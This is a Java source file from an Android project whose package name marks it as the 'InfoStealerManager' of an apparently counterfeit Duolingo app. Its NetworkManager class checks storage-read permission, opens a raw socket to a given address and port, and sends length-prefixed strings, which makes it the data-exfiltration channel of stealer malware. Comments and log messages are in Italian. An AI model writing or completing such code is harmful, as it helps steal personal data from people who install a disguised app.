package com.example.duolingopezzotto.InfoStealerManager;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.io.*;
import java.net.*;

public class NetworkManager {
    private Socket socket;
    private DataOutputStream out;

    public void openConnection(String address, int port,Context context) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            System.out.println("Mnacano i permessi per Internet");
        } else {
            try {
                socket = new Socket(address, port);
                do{
                    if(socket.isConnected()){
                        out = new DataOutputStream(socket.getOutputStream());
                    }
                }while(!socket.isConnected());
            } catch (IOException he) {
            } finally {
                if (socket != null && !socket.isConnected()) closeConnection();
            }
        }
    }


    public void sendMessage(StringBuilder message) {
        String messaggio = message.toString();
        try {
            if(out == null) { throw new Exception(); }
            // Converte la stringa del messaggio in un array di byte
            byte[] messageBytes = messaggio.getBytes();
            // Invia i dati al server
            out.flush();
            out.write(messaggio.length());
            out.write(messageBytes);

        } catch (IOException e) {
            System.err.println("Si è verificato un errore durante l'invio del messaggio:");
            e.printStackTrace();
        } catch (Exception e) {
            System.err.println("Si è verificato un errore imprevisto:");
            e.printStackTrace();
        }
    }
    public void closeConnection(){
        try {
            socket.close();
        } catch (IOException io) { Log.e("Network Manager", "Error closing connection: " + io); }
    }
}
